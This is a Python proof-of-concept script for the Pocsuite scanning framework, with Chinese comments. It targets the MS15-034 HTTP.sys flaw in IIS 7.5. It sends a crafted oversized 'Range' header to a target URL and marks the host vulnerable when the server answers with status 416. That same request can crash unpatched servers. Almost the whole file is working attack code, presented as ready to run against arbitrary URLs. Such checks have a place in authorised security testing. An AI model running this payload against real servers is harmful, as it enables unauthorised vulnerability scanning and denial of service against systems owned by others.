#!/usr/bin/env python
# coding: utf-8

import urllib
import random
import string
from collections import OrderedDict

from pocsuite.api.request import req  #用法和 requests 完全相同
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase


class TestPOC(POCBase):
    PocName = 'iis_ms15_034_exec '
    vulID = '89233'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = 'lyb'  #  PoC作者的大名
    vulDate = '2018/6/7'  #漏洞公开的时间,不知道就写今天
    createDate = '2018/6/7'  # 编写 PoC 的日期
    updateDate = '2018/6/7'  # PoC 更新的时间,默认和编写时间一样
    references = [
        'https://technet.microsoft.com/library/security/ms15-034']  # 漏洞地址来源,0day不用写
    name = 'iis http.sys ms15-034漏洞 PoC'  # PoC 名称
    appPowerLink = 'https://www.microsoft.com/'  # 漏洞厂商主页地址
    appName = 'iis'  # 漏洞应用名称
    appVersion = '7.5'  # 漏洞影响版本
    vulType = 'Command Execution'  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。
    '''  # 漏洞简要描述
    samples = []  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写

    def _attack(self):
        '''attack mode'''
        return self._verify()

    def _verify(self):
        '''verify mode'''
        result = {}
        self.url = self.url
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.2; rv:30.0) Gecko/20150101 Firefox/32.0",
                   "Accept-Encoding": "gzip, deflate",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                   "Range": "bytes=0-18446744073709551615",
                   "Referer": "https://github.com/zigoo0/",
                   "Connection": "keep-alive"
                   }
        r = req.get(self.url, headers=headers, verify=False, timeout=5)
        if r.status_code == 416 or "Requested Range Not Satisfiable" in r.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
